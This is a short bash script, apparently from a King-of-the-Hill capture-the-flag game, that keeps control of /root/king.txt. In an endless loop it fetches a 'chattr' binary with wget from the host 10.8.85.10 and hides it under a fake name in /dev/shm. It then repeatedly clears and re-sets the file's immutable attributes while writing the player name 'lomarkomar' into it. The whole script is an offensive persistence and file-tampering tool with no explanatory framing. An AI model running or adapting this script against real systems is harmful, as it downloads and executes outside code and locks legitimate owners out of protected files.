#!/bin/bash
king_path='/root/king.txt'
fake_chattr='asd'
fake_chattr_path='/dev/shm'
chattr_path=$fake_chattr_path'/'$fake_chattr
local_IP='10.8.85.10'
while true; do
if [[ ! -e $chattr_path ]]; then
	cd $fake_chattr_path
	wget $local_IP'/chattr'
	mv $fake_chattr_path'/chattr' $chattr_path
	chmod 100 $chattr_path
fi 
$chattr_path -ia $king_path
echo 'lomarkomar' >| $king_path
$chattr_path +ia $king_path
done
